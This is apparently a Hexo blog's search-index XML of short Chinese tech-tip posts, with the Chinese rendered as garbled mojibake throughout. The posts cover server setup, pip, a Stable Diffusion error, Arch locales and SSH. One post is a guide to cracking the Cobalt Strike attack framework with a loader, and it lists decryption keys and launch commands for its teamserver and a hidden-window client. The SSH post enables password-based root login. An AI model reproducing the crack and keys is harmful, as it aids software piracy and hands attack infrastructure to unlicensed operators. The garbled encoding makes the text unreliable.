id="å®‰è£…-CentOS-8"><a href="#å®‰è£…-CentOS-8" class="headerlink" title="å®‰è£… CentOS 8"></a>å®‰è£… CentOS 8</h3><p>å®‰è£…çš„è¿‡ç¨‹å¾ˆç®€å•ï¼Œè‹¥æ˜¯æœ‰ä¸æ˜ç™½çš„åœ°æ–¹ï¼Œè¯·è§‚çœ‹ <a href="https://v2rayssr.com/go?url=https://youtu.be/grebA_WHGXY"><strong>è§†é¢‘æ•™ç¨‹</strong></a></p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/3434.jpg" alt="img"></p><p>å®‰è£…å®Œæˆä»¥åï¼Œæˆ‘ä»¬å°±ç›´æ¥å¯ä»¥ä» SSH å·¥å…·ï¼Œç™»å½•æˆ‘ä»¬çš„ <code>CentOS 8-stream</code> äº†</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/444.jpg" alt="img"></p><blockquote><p>å‹æƒ…æé†’ï¼šå¯ä»¥æ›´æ”¹ VPS ä¸»æœºå</p><pre class="line-numbers language-none"><code class="language-none">hostnamectl set-hostname host.aaa.com --transienthostnamectl set-hostname host.aaa.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h3 id="å®‰è£…å®å¡”é¢æ¿"><a href="#å®‰è£…å®å¡”é¢æ¿" class="headerlink" title="å®‰è£…å®å¡”é¢æ¿"></a>å®‰è£…å®å¡”é¢æ¿</h3><p>å®‰è£…å®å¡”é¢æ¿ï¼Œç›¸å…³çš„æ’ä»¶ï¼Œè®¾ç½®ç½‘ç«™ï¼</p><p>åœ¨å®‰è£…å®å¡”é¢æ¿çš„è¿‡ç¨‹ä¸­ï¼Œæˆ–è®¸æœ‰ä¸‹å›¾çš„é”™è¯¯æç¤ºï¼Œçœ‹ç€å¾ˆå“äººï¼š</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/55.jpg" alt="img"></p><p>å…¶å®ï¼Œè¿™ä¸ªåªæ˜¯ <code>pip</code> çš„ç‰ˆæœ¬å¤ªä½ï¼Œæˆ‘ä»¬æ ¹æ®æç¤ºå‘½ä»¤æ›´æ–°ä¸‹å°±å¥½äº†ï¼</p><p>åœ¨å®å¡”é¢æ¿é‡Œé¢ï¼Œæ¨èå®‰è£…å¦‚ä¸‹è¿è¡Œç¯å¢ƒï¼šï¼ˆLNMP â€“ ç¼–è¯‘å®‰è£…ï¼‰å› ä¸ºä¸‹é¢ç‰ˆæœ¬æˆ‘å®‰è£…å¹¶æ²¡æœ‰å‡ºé”™ã€‚</p><p><img src="https://v2rayssr.com/wp-content/themes/b2/Assets/fontend/images/default-img.jpg" alt="img"></p><p>ç¼–è¯‘å®‰è£…æ—¶é—´æœ‰ç‚¹é•¿ï¼Œä½†æ˜¯æ›´ç¨³å®šå¯é ï¼Œå¤§å®¶è€å¿ƒç­‰å¾…ï¼Œä¸‹é¢æ˜¯æˆ‘ç­‰å¾…çš„æ—¶é—´ï¼š</p><pre class="line-numbers language-none"><code class="language-none">å®‰è£…[opcache-74]ã€å·²å®Œæˆã€‘è€—æ—¶12ç§’å®‰è£…[exif-74]ã€å·²å®Œæˆã€‘è€—æ—¶19ç§’å®‰è£…[imagemagick-74]ã€å·²å®Œæˆã€‘è€—æ—¶38ç§’å®‰è£…[redis-74]ã€å·²å®Œæˆã€‘è€—æ—¶74ç§’å®‰è£…[fileinfo-74]ã€å·²å®Œæˆã€‘è€—æ—¶30ç§’å®‰è£…[php-7.4]ã€å·²å®Œæˆã€‘è€—æ—¶179ç§’å®‰è£…[mysql-5.7]ã€å·²å®Œæˆã€‘è€—æ—¶991ç§’å®‰è£…[nginx-1.20]ã€å·²å®Œæˆã€‘è€—æ—¶376ç§’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®Œæˆä»¥åï¼Œçœ‹è§ç›‘æ§æ çš„å‡ é¡¹å‚æ•°ï¼Œç¬é—´è§‰å¾—ï¼Œå“‡ï¼ç”²éª¨æ–‡ YYDSï¼</p><p><img src="https://v2rayssr.com/wp-content/themes/b2/Assets/fontend/images/default-img.jpg" alt="img"></p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/343434.jpg" alt="img"></p><p>è®¾ç½®å¥½äº† WordPress ä»¥åï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ WordPress çš„ç«™ç‚¹å¥åº·æ£€æµ‹ï¼š</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/3423.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxåˆ°æ‰‹æ—¶éœ€è¦å®‰è£…</title>
      <link href="/2023/03/08/linux-dao-shou-shi-xu-yao-an-zhuang/"/>
      <url>/2023/03/08/linux-dao-shou-shi-xu-yao-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="linuxåˆ°æ‰‹æ—¶éœ€è¦å®‰è£…"><a href="#linuxåˆ°æ‰‹æ—¶éœ€è¦å®‰è£…" class="headerlink" title="linuxåˆ°æ‰‹æ—¶éœ€è¦å®‰è£…"></a>linuxåˆ°æ‰‹æ—¶éœ€è¦å®‰è£…</h1><h2 id="å®‰è£…çš„ä¾èµ–"><a href="#å®‰è£…çš„ä¾èµ–" class="headerlink" title="å®‰è£…çš„ä¾èµ–"></a>å®‰è£…çš„ä¾èµ–</h2><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python-openssl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>json.decoder.JSONDecodeError</title>
      <link href="/2023/03/04/json.decoder.jsondecodeerror/"/>
      <url>/2023/03/04/json.decoder.jsondecodeerror/</url>
      
        <content type="html"><![CDATA[<h1 id="json-decoder-JSONDecodeError"><a href="#json-decoder-JSONDecodeError" class="headerlink" title="json.decoder.JSONDecodeError"></a>json.decoder.JSONDecodeError</h1><p>æˆ‘æ˜¯å®‰è£…<code>stable diffusion</code>å‡ºç°çš„é”™è¯¯</p><p>å¤§è‡´æˆªå›¾</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> File <span class="token string">"G:<span class="token entity" title="\r">\r</span>uanjian\stable-diffusion-webui-master<span class="token entity" title="\0">\0</span>xdadream\lib\site-packages<span class="token entity" title="\t">\t</span>ransformers<span class="token entity" title="\t">\t</span>okenization_utils_base.py"</span>, line <span class="token number">1956</span>, <span class="token keyword">in</span> _from_pretrained    tokenizer <span class="token operator">=</span> cls<span class="token punctuation">(</span>*init_inputs, **init_kwargs<span class="token punctuation">)</span>  File <span class="token string">"G:<span class="token entity" title="\r">\r</span>uanjian\stable-diffusion-webui-master<span class="token entity" title="\0">\0</span>xdadream\lib\site-packages<span class="token entity" title="\t">\t</span>ransformers\models<span class="token entity" title="\c">\c</span>lip<span class="token entity" title="\t">\t</span>okenization_clip.py"</span>, line <span class="token number">323</span>, <span class="token keyword">in</span> __init__    self.encoder <span class="token operator">=</span> json.load<span class="token punctuation">(</span>vocab_handle<span class="token punctuation">)</span> â€¦â€¦â€¦â€¦json.decoder.JSONDecodeError: Unterminated string starting at: line <span class="token number">1</span> <span class="token function">column</span> <span class="token number">11370</span> <span class="token punctuation">(</span>char <span class="token number">11369</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é—®é¢˜å‡ºåœ¨è¿™<code>json.load(vocab_handle)</code></p><p>æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶å­˜æ”¾ç›®å½•<code>C:\Users\xxx\.cache\huggingface\hub\models--openai--clip-vit-large-patch14\blobs\xxxx</code>ï¼ŒæŠŠä¸‹é¢ä¸œè¥¿å…¨åˆ é™¤</p><p><a href="https://huggingface.co/openai/clip-vit-base-patch32/resolve/main/vocab.json%EF%BC%8C%E4%B8%8B%E8%BD%BD%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E6%94%BE%E5%9C%A8%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cbat%E6%96%87%E4%BB%B6%E5%B0%B1%E6%88%90%E5%8A%9F%E4%BA%86">https://huggingface.co/openai/clip-vit-base-patch32/resolve/main/vocab.jsonï¼Œä¸‹è½½è¿™ä¸ªæ–‡ä»¶æ”¾åœ¨ç›®å½•ä¸‹ï¼Œé‡æ–°æ‰§è¡Œbatæ–‡ä»¶å°±æˆåŠŸäº†</a></p><p>è¿™ä¸ªé—®é¢˜æ˜¯å› ä¸ºæ–‡ä»¶å‡ºç°äº†ç ´æŸ</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pipçš„ä½¿ç”¨</title>
      <link href="/2022/12/20/pip-de-shi-yong/"/>
      <url>/2022/12/20/pip-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="pipå®‰è£…"><a href="#pipå®‰è£…" class="headerlink" title="pipå®‰è£…"></a>pipå®‰è£…</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>ä¸å†™äº†</p><h3 id="linuxï¼ˆubuntuï¼‰"><a href="#linuxï¼ˆubuntuï¼‰" class="headerlink" title="linuxï¼ˆubuntuï¼‰"></a>linuxï¼ˆubuntuï¼‰</h3><h2 id="pipçš„ä½¿ç”¨"><a href="#pipçš„ä½¿ç”¨" class="headerlink" title="pipçš„ä½¿ç”¨"></a>pipçš„ä½¿ç”¨</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token parameter variable">--version</span> <span class="token comment">#æ˜¾ç¤ºç‰ˆæœ¬å’Œè·¯å¾„</span>pip <span class="token function">install</span> <span class="token parameter variable">-U</span> pip <span class="token comment">#å‡çº§pip</span>pip <span class="token function">install</span> SomePackage              <span class="token comment"># æœ€æ–°ç‰ˆæœ¬</span>pip <span class="token function">install</span> <span class="token assign-left variable">SomePackage</span><span class="token operator">==</span><span class="token number">1.0</span>.4       <span class="token comment"># æŒ‡å®šç‰ˆæœ¬</span>pip <span class="token function">install</span> <span class="token string">'SomePackage&gt;=1.0.4'</span>     <span class="token comment"># æœ€å°ç‰ˆæœ¬</span>pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> SomePackage   <span class="token comment">#å‡çº§åŒ…</span>pip uninstall SomePackage  <span class="token comment">#å¸è½½åŒ…</span>pip search SomePackage  <span class="token comment">#æœç´¢åŒ…</span>pip show   <span class="token comment">#æ˜¾ç¤ºå®‰è£…åŒ…ä¿¡æ¯ </span>pip show <span class="token parameter variable">-f</span> SomePackage  <span class="token comment">#æŸ¥çœ‹æŒ‡å®šåŒ…çš„è¯¦ç»†ä¿¡æ¯</span>pip list  <span class="token comment">#åˆ—å‡ºå·²å®‰è£…çš„åŒ…</span>pip list <span class="token parameter variable">-o</span>  <span class="token comment">#æŸ¥çœ‹å¯å‡çº§çš„åŒ…</span>pip <span class="token function">install</span> <span class="token parameter variable">-i</span> https://pypi.tuna.tsinghua.edu.cn/simple some-package  <span class="token comment">#æŒ‡å®šæºå®‰è£…</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ•™ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strikeå®‰è£…å’Œç ´è§£</title>
      <link href="/2022/05/24/cobalt-strike-an-zhuang-he-po-jie/"/>
      <url>/2022/05/24/cobalt-strike-an-zhuang-he-po-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobalt-Strikeå®‰è£…å’Œç ´è§£"><a href="#Cobalt-Strikeå®‰è£…å’Œç ´è§£" class="headerlink" title="Cobalt Strikeå®‰è£…å’Œç ´è§£"></a>Cobalt Strikeå®‰è£…å’Œç ´è§£</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>é¦–å…ˆCSåˆ†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æˆ‘é€‰æ‹©æ¶è®¾åœ¨kaliä¸­ï¼Œå®¢æˆ·ç«¯åœ¨windows11</p><p>é¦–å…ˆå¿…é¡»æœ‰Javaç¯å¢ƒï¼Œkaliå†…ç½®Javaç¯å¢ƒï¼Œwindowsè‡ªè¡ŒæŸ¥æ‰¾</p><h3 id="CSä¸‹è½½"><a href="#CSä¸‹è½½" class="headerlink" title="CSä¸‹è½½"></a>CSä¸‹è½½</h3><p>åœ°å€</p><p>éªŒè¯ç‰ˆæœ¬</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certutil <span class="token parameter variable">-hashfile</span> cobaltstrike.jar SHA256<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ç ´è§£-æ±‰åŒ–"><a href="#ç ´è§£-æ±‰åŒ–" class="headerlink" title="ç ´è§£+æ±‰åŒ–"></a>ç ´è§£+æ±‰åŒ–</h2><p>ä¸‹è½½CSAgent<a href="https://github.com/Twi1ight/CSAgent">Twi1ight/CSAgent: CobaltStrike 4.xé€šç”¨ç™½å«–åŠæ±‰åŒ–åŠ è½½å™¨ (github.com)</a></p><p>å°†æ–‡ä»¶è§£å‹åˆ°ä¸CSç›¸åŒçš„ç›®å½•ä¸‹</p><p>æ›¿æ¢cobaltstrikeã€teamserverã€agscriptã€c2lintã€cobaltstrike.batæ–‡ä»¶ä¸­çš„è§£å¯†keyï¼Œç›®å‰å†…ç½®çš„keyä¸º4.4ç‰ˆæœ¬</p><p>å„ä¸ªç‰ˆæœ¬çš„å®˜æ–¹è§£å¯†keyï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">4.0</span> 1be5be52c6255c33558e8a1cb667cb06<span class="token number">4.1</span> 80e32a742060b884419ba0c171c9aa76<span class="token number">4.2</span> b20d487addd4713418f2d5a3ae02a7a0<span class="token number">4.3</span> 3a4425490f389aeec312bdd758ad2b99<span class="token number">4.4</span> 5e98194a01c6b48fa582a6a9fcbb92d6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹å°±èƒ½æ­£å¸¸ä½¿ç”¨äº†</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><h3 id="kaliå¯åŠ¨æœåŠ¡ç«¯"><a href="#kaliå¯åŠ¨æœåŠ¡ç«¯" class="headerlink" title="kaliå¯åŠ¨æœåŠ¡ç«¯"></a>kaliå¯åŠ¨æœåŠ¡ç«¯</h3><p>åœ¨å­˜æ”¾æ–‡ä»¶çš„ä¸»ç›®å½•æ‰“å¼€ç»ˆç«¯</p><p>è¿è¡Œå‘½ä»¤ï¼Œå½“ç„¶ä½ è¦å…ˆä¿è¯<code>teamserver</code>æ–‡ä»¶æœ‰æ‰§è¡Œæƒé™</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./teamserver kali_IP password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>passwordä¸ºä½ æƒ³è®¾ç½®çš„è¿æ¥å¯†ç ï¼Œå¾…ä¼šå®¢æˆ·ç«¯è¿æ¥ä¼šä½¿ç”¨</p><h3 id="kalié‡Œå¯åŠ¨å®¢æˆ·ç«¯"><a href="#kalié‡Œå¯åŠ¨å®¢æˆ·ç«¯" class="headerlink" title="kalié‡Œå¯åŠ¨å®¢æˆ·ç«¯"></a>kalié‡Œå¯åŠ¨å®¢æˆ·ç«¯</h3><p>å¯ä»¥åŒæ—¶åœ¨kaliè¿è¡Œ</p><p>å¯ä»¥è¿è¡Œå‘½ä»¤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-XX:ParallelGCThreads</span><span class="token operator">=</span><span class="token number">4</span> <span class="token parameter variable">-XX:+AggressiveHeap</span> <span class="token parameter variable">-XX:+UseParallelGC</span> <span class="token parameter variable">-javaagent:CSAgent.jar</span><span class="token operator">=</span>5e98194a01c6b48fa582a6a9fcbb92d6 <span class="token parameter variable">-Duser.language</span><span class="token operator">=</span>en <span class="token parameter variable">-jar</span> cobaltstrike.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸ºæ–¹ä¾¿å¯ä»¥å†™å…¥shæ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> clients.sh<span class="token comment">#å¤åˆ¶è¿›å…¥</span><span class="token function">java</span> <span class="token parameter variable">-XX:ParallelGCThreads</span><span class="token operator">=</span><span class="token number">4</span> <span class="token parameter variable">-XX:+AggressiveHeap</span> <span class="token parameter variable">-XX:+UseParallelGC</span> <span class="token parameter variable">-javaagent:CSAgent.jar</span><span class="token operator">=</span>5e98194a01c6b48fa582a6a9fcbb92d6 <span class="token parameter variable">-Duser.language</span><span class="token operator">=</span>en <span class="token parameter variable">-jar</span> cobaltstrike.jar<span class="token function">chmod</span> <span class="token number">777</span> clients.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="windowsä¸­è¿è¡Œå®¢æˆ·ç«¯"><a href="#windowsä¸­è¿è¡Œå®¢æˆ·ç«¯" class="headerlink" title="windowsä¸­è¿è¡Œå®¢æˆ·ç«¯"></a>windowsä¸­è¿è¡Œå®¢æˆ·ç«¯</h3><p>æ‰§è¡Œè¿è¡Œcobaltstrike.bat</p><p>è‹¥æƒ³éšè—å¼¹æ¡†ï¼Œåˆ›å»ºcobaltstrike.vbsçš„å†…å®¹ä¸º</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CreateObject<span class="token punctuation">(</span><span class="token string">"WScript.Shell"</span><span class="token punctuation">)</span>.Run <span class="token string">"java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -jar cobaltstrike.jar"</span>,0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> å®‰è£… </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxä¸­echoå†™å…¥æ–‡ä»¶</title>
      <link href="/2022/05/24/linux-zhong-echo-xie-ru-wen-jian/"/>
      <url>/2022/05/24/linux-zhong-echo-xie-ru-wen-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="linuxä¸­echoå†™å…¥æ–‡ä»¶"><a href="#linuxä¸­echoå†™å…¥æ–‡ä»¶" class="headerlink" title="linuxä¸­echoå†™å…¥æ–‡ä»¶"></a>linuxä¸­echoå†™å…¥æ–‡ä»¶</h1><h2 id="è¦†ç›–æ–‡ä»¶å†…å®¹"><a href="#è¦†ç›–æ–‡ä»¶å†…å®¹" class="headerlink" title="è¦†ç›–æ–‡ä»¶å†…å®¹"></a>è¦†ç›–æ–‡ä»¶å†…å®¹</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"test"</span> <span class="token operator">&gt;</span> test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="è¿½åŠ æ–‡ä»¶å†…å®¹"><a href="#è¿½åŠ æ–‡ä»¶å†…å®¹" class="headerlink" title="è¿½åŠ æ–‡ä»¶å†…å®¹"></a>è¿½åŠ æ–‡ä»¶å†…å®¹</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"test"</span> <span class="token operator">&gt;&gt;</span> test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åé¢ä¼šè‡ªåŠ¨åŠ /n</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> å‘½ä»¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win7ä¸­å®‰è£…vm-toolsæ—¶Windows æ— æ³•éªŒè¯æ­¤é©±åŠ¨ç¨‹åºè½¯ä»¶çš„å‘å¸ƒè€…</title>
      <link href="/2022/05/20/win7-bu-neng-an-zhuang-vm-tools/"/>
      <url>/2022/05/20/win7-bu-neng-an-zhuang-vm-tools/</url>
      
        <content type="html"><![CDATA[<h1 id="win7ä¸­å®‰è£…vm-toolsæ—¶Windows-æ— æ³•éªŒè¯æ­¤é©±åŠ¨ç¨‹åºè½¯ä»¶çš„å‘å¸ƒè€…"><a href="#win7ä¸­å®‰è£…vm-toolsæ—¶Windows-æ— æ³•éªŒè¯æ­¤é©±åŠ¨ç¨‹åºè½¯ä»¶çš„å‘å¸ƒè€…" class="headerlink" title="win7ä¸­å®‰è£…vm-toolsæ—¶Windows æ— æ³•éªŒè¯æ­¤é©±åŠ¨ç¨‹åºè½¯ä»¶çš„å‘å¸ƒè€…"></a>win7ä¸­å®‰è£…vm-toolsæ—¶Windows æ— æ³•éªŒè¯æ­¤é©±åŠ¨ç¨‹åºè½¯ä»¶çš„å‘å¸ƒè€…</h1><p>ä¸‹è½½è¡¥ä¸å®‰è£…<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=kb4474419">Microsoft Update Catalog</a></p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>archlinuxè®¾ç½®ä¸­æ–‡</title>
      <link href="/2022/05/17/archlinux-she-zhi-zhong-wen/"/>
      <url>/2022/05/17/archlinux-she-zhi-zhong-wen/</url>
      
        <content type="html"><![CDATA[<h1 id="archlinuxè®¾ç½®ä¸­æ–‡"><a href="#archlinuxè®¾ç½®ä¸­æ–‡" class="headerlink" title="archlinuxè®¾ç½®ä¸­æ–‡"></a>archlinuxè®¾ç½®ä¸­æ–‡</h1><p>æ‰§è¡Œ<code>vim /etc/locale.gen</code>å°†ä¸‹é¢å­—ç¬¦å‰çš„#å»æ‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zh_CN.GB18030 GB18030zh_CN.UTF-8 UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>locale -a</code>æŸ¥çœ‹å½“å‰å¯ç”¨locale</p><p><code>vim /etc/locale.conf</code>æ·»åŠ <code>LANG=zh_CN.UTF-8</code>ï¼Œè¿™ä¸æ˜¯å¿…é¡»çš„ï¼Œä¼šå¯¼è‡´ä¹±ç </p><p>è¿™æ ·åšä¼šå¥½äº›</p><p>æ·»åŠ </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF-8<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>zh_CN:en_US<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆ°ä¸‹é¢3ä¸ªæ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.bashrcï¼šæ¯æ¬¡ä½¿ç”¨ç»ˆç«¯æ—¶ä¼šåº”ç”¨æ­¤å¤„çš„è®¾ç½®.xinitrcï¼šæ¯æ¬¡ä½¿ç”¨ startx æˆ– SLiM æ¥å¯åŠ¨ X çª—å£ç³»ç»Ÿæ—¶ä¼šåº”ç”¨æ­¤å¤„çš„è®¾ç½®.xprofileï¼šæ¯æ¬¡ä½¿ç”¨ GDM ç­‰æ˜¾ç¤ºç®¡ç†å™¨æ—¶ä¼šåº”ç”¨æ­¤å¤„çš„è®¾ç½®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å®‰è£…å­—ä½“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-S</span> wqy-zenhei<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€åæ·»åŠ å¦‚ä¸‹åˆ°ä¸Šè¿°ä¸‰ä¸ªæ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF8<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>zh_CN:en_US<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">XMODIFIERS</span></span><span class="token operator">=</span>@im<span class="token operator">=</span>WQY<span class="token builtin class-name">export</span> <span class="token assign-left variable">GTK_IM_MODULE</span><span class="token operator">=</span><span class="token string">"wqy"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">QT_IM_MODULE</span><span class="token operator">=</span><span class="token string">"wqy"</span>wqy <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxè®¾ç½®rootå¯†ç </title>
      <link href="/2022/05/17/linux-she-zhi-root-mi-ma/"/>
      <url>/2022/05/17/linux-she-zhi-root-mi-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="linuxè®¾ç½®rootå¯†ç "><a href="#linuxè®¾ç½®rootå¯†ç " class="headerlink" title="linuxè®¾ç½®rootå¯†ç "></a>linuxè®¾ç½®rootå¯†ç </h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-i</span><span class="token function">passwd</span><span class="token comment">#è¾“å…¥ä½ çš„å¯†ç </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxå¼€å¯ssh</title>
      <link href="/2022/05/17/linux-kai-qi-ssh/"/>
      <url>/2022/05/17/linux-kai-qi-ssh/</url>
      
        <content type="html"><![CDATA[<h1 id="linuxå¼€å¯ssh"><a href="#linuxå¼€å¯ssh" class="headerlink" title="linuxå¼€å¯ssh"></a>linuxå¼€å¯ssh</h1><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config<span class="token comment">#ä¿®æ”¹</span><span class="token comment">#PermitRootLogin prohibit-password   æ”¹ä¸º PermitRootLogin yes</span><span class="token comment">#PasswordAuthentication yes  æ”¹ä¸º   PasswordAuthentication yes</span><span class="token comment">#Esc-&gt;:-&gt;wqä¿å­˜</span><span class="token comment">#å¯åŠ¨</span>/etc/init.d/ssh start or<span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">ssh</span> start<span class="token comment">#å¼€æœºå¯åŠ¨</span>update-rc.d <span class="token function">ssh</span> <span class="token builtin class-name">enable</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> openssh-server<span class="token comment">#å¯åŠ¨</span>/etc/init.d/ssh start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu22.04LTSä¸èƒ½è¿è¡ŒAppimage</title>
      <link href="/2022/05/17/ubuntu22.04lts-bu-neng-yun-xing-appimage/"/>
      <url>/2022/05/17/ubuntu22.04lts-bu-neng-yun-xing-appimage/</url>
      
